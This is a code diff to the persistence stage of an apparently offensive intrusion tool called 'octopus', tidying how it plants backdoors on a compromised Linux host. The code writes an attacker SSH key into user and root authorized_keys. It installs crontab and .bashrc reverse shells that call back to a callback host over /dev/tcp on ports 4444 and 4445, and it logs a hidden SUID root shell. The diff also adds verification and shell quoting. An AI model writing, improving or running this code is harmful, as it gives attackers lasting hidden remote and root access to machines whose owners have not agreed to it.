@@ -4,6 +4,7 @@ Stage 6: Persistence mechanisms (SSH keys, crontab, SUID shell).
 """
 
 import os
+import shlex
 import subprocess
 
 try:
@@ -79,7 +80,7 @@ def plant_persistence(
         try:
             from core.opsec.artifact_mgr import ArtifactManager
 
-            am = ArtifactManager(host)
+            am = ArtifactManager(target_ip=host)
         except ImportError:
             am = None
 
@@ -107,7 +108,11 @@ def plant_persistence(
 
             # Inject into target
             _ssh_exec(client, "mkdir -p ~/.ssh && chmod 700 ~/.ssh", timeout=5)
-            _ssh_exec(client, f"echo '{pub_key}' >> ~/.ssh/authorized_keys", timeout=5)
+            _ssh_exec(
+                client,
+                f"printf '%s\\n' {shlex.quote(pub_key)} >> ~/.ssh/authorized_keys",
+                timeout=5,
+            )
             _ssh_exec(client, "chmod 600 ~/.ssh/authorized_keys", timeout=5)
             # Verify
             check = _ssh_exec(client, "grep octopus ~/.ssh/authorized_keys", timeout=5)
@@ -123,30 +128,48 @@ def plant_persistence(
             # If root, also inject into root's authorized_keys
             if is_root:
                 _ssh_exec(client, "mkdir -p /root/.ssh && chmod 700 /root/.ssh", timeout=5)
-                _ssh_exec(client, f"echo '{pub_key}' >> /root/.ssh/authorized_keys", timeout=5)
+                _ssh_exec(
+                    client,
+                    f"printf '%s\\n' {shlex.quote(pub_key)} >> /root/.ssh/authorized_keys",
+                    timeout=5,
+                )
                 _ssh_exec(client, "chmod 600 /root/.ssh/authorized_keys", timeout=5)
-                output += "[+] SSH key also injected into /root/.ssh/authorized_keys\n"
-                if am:
-                    am.record_ssh_key("root", "octopus")
+                root_check = _ssh_exec(client, "grep octopus /root/.ssh/authorized_keys", timeout=5)
+                if "octopus" in root_check:
+                    output += "[+] SSH key also injected into /root/.ssh/authorized_keys\n"
+                    if am:
+                        am.record_ssh_key("root", "octopus")
 
         # ── METHOD 2: Crontab reverse shell ──────────────────────
         print(f"    {C_CYAN}[*] Setting up crontab persistence...{C_RESET}")
         # Get our IP for reverse shell
         our_ip = callback_host
         if our_ip:
-            cron_cmd = f"*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/{our_ip}/4444 0>&1' 2>/dev/null"
+            cron_marker = "octopus-persistence"
+            cron_cmd = (
+                f"*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/{our_ip}/4444 0>&1' "
+                f"2>/dev/null # {cron_marker}"
+            )
             # Add to crontab without overwriting
             existing_cron = _ssh_exec(client, "crontab -l 2>/dev/null", timeout=5)
-            if "octopus" not in existing_cron and "/dev/tcp" not in existing_cron:
+            if cron_marker not in existing_cron and "/dev/tcp" not in existing_cron:
                 _ssh_exec(
-                    client, f'(crontab -l 2>/dev/null; echo "# octopus"; echo "{cron_cmd}") | crontab -', timeout=10
+                    client,
+                    f"(crontab -l 2>/dev/null; printf '%s\\n' {shlex.quote(cron_cmd)}) | crontab -",
+                    timeout=10,
                 )
-                verify = _ssh_exec(client, "crontab -l 2>/dev/null | grep octopus", timeout=5)
-                if "octopus" in verify:
+                verify = _ssh_exec(
+                    client,
+                    f"crontab -l 2>/dev/null | grep -F -- {shlex.quote(cron_marker)}",
+                    timeout=5,
+                )
+                if cron_marker in verify:
                     persistence_methods.append(f"Crontab reverse shell → {our_ip}:4444 every 5min")
                     output += f"[+] CRONTAB persistence set — rev shell to {our_ip}:4444 every 5 min\n"
                     output += "    Catch with: nc -lvnp 4444\n"
                     print(f"    {C_GREEN}[+] Crontab persistence set{C_RESET}")
+                    if am:
+                        am.record_cron(user, cron_marker)
                 else:
                     output += "[-] Crontab write failed\n"
             else:
@@ -165,18 +188,42 @@ def plant_persistence(
                 output += "[+] HIDDEN SUID SHELL created at /usr/local/share/.mtr_shell\n"
                 output += "    Use: /usr/local/share/.mtr_shell -p\n"
                 print(f"    {C_GREEN}[+] SUID shell created{C_RESET}")
+                if am:
+                    am.record_file(
+                        "/usr/local/share/.mtr_shell",
+                        "Hidden SUID shell created by persistence stage",
+                    )
 
         # ── METHOD 4: .bashrc backdoor ───────────────────────────
         print(f"    {C_CYAN}[*] Adding .bashrc persistence...{C_RESET}")
+        bashrc_marker = "octopus-persistence"
         bashrc_payload = (
-            f"\n# system update check\n(bash -i >& /dev/tcp/{our_ip}/4445 0>&1 &) 2>/dev/null\n" if our_ip else ""
+            f"(bash -i >& /dev/tcp/{our_ip}/4445 0>&1 &) 2>/dev/null # {bashrc_marker}"
+            if our_ip
+            else ""
         )
         if bashrc_payload:
-            existing = _ssh_exec(client, "cat ~/.bashrc 2>/dev/null | grep 'system update check'", timeout=5)
-            if "system update" not in existing:
-                _ssh_exec(client, f"echo '{bashrc_payload}' >> ~/.bashrc", timeout=5)
-                persistence_methods.append(f".bashrc reverse shell → {our_ip}:4445 on login")
-                output += f"[+] .bashrc backdoor added — rev shell to {our_ip}:4445 on user login\n"
+            existing = _ssh_exec(
+                client,
+                f"grep -F -- {shlex.quote(bashrc_marker)} ~/.bashrc 2>/dev/null",
+                timeout=5,
+            )
+            if bashrc_marker not in existing:
+                _ssh_exec(
+                    client,
+                    f"printf '%s\\n' {shlex.quote(bashrc_payload)} >> ~/.bashrc",
+                    timeout=5,
+                )
+                verify = _ssh_exec(
+                    client,
+                    f"grep -F -- {shlex.quote(bashrc_marker)} ~/.bashrc 2>/dev/null",
+                    timeout=5,
+                )
+                if bashrc_marker in verify:
+                    persistence_methods.append(f".bashrc reverse shell → {our_ip}:4445 on login")
+                    output += f"[+] .bashrc backdoor added — rev shell to {our_ip}:4445 on user login\n"
+                    if am:
+                        am.record_file_line("~/.bashrc", bashrc_marker, user)
 
         output += f"\n{'═' * 60}\n"
         output += f"Persistence methods planted: {len(persistence_methods)}\n"
